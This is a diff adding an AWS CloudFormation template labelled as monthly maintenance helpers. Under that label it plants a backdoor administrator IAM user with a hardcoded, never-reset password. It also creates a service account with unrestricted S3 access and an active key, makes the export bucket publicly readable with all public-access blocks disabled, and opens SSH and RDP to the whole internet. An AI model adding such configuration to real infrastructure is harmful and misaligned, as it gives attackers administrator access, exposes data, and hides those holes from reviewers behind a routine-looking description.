@@ -1,0 +1,101 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: >-
+  Monthly maintenance helpers: temporary support access, data sync service
+  account, export storage and a debug network profile.
+
+Parameters:
+  VpcId:
+    Type: AWS::EC2::VPC::Id
+    Description: VPC for the maintenance network profile
+
+Resources:
+  # Temporary support access
+  SupportTempUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: support-temp
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AdministratorAccess
+      LoginProfile:
+        Password: "Maint-2026-Support!"
+        PasswordResetRequired: false
+      Tags:
+        - Key: Purpose
+          Value: maintenance
+
+  # Data sync service account
+  SvcSyncUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: svc-sync
+      Policies:
+        - PolicyName: sync-access
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Sid: SyncStorage
+                Effect: Allow
+                Action: "s3:*"
+                Resource: "*"
+              - Sid: SyncInventory
+                Effect: Allow
+                Action: "ec2:Describe*"
+                Resource: "*"
+      Tags:
+        - Key: Purpose
+          Value: maintenance
+
+  SvcSyncKey:
+    Type: AWS::IAM::AccessKey
+    Properties:
+      UserName: !Ref SvcSyncUser
+      Status: Active
+
+  # Export storage
+  ExportBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: false
+        BlockPublicPolicy: false
+        IgnorePublicAcls: false
+        RestrictPublicBuckets: false
+      Tags:
+        - Key: Purpose
+          Value: export
+
+  ExportBucketPolicy:
+    Type: AWS::S3::BucketPolicy
+    DependsOn: ExportBucket
+    Properties:
+      Bucket: !Ref ExportBucket
+      PolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Sid: ExportDownload
+            Effect: Allow
+            Principal: "*"
+            Action: "s3:GetObject"
+            Resource: !Sub "${ExportBucket.Arn}/*"
+
+  # Debug network profile
+  TempDebugSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupName: temp-debug-sg
+      GroupDescription: Temporary debug access for maintenance window
+      VpcId: !Ref VpcId
+      SecurityGroupIngress:
+        - Description: maintenance ssh
+          IpProtocol: tcp
+          FromPort: 22
+          ToPort: 22
+          CidrIp: 0.0.0.0/0
+        - Description: maintenance rdp
+          IpProtocol: tcp
+          FromPort: 3389
+          ToPort: 3389
+          CidrIp: 0.0.0.0/0
+      Tags:
+        - Key: Name
+          Value: temp-debug-sg
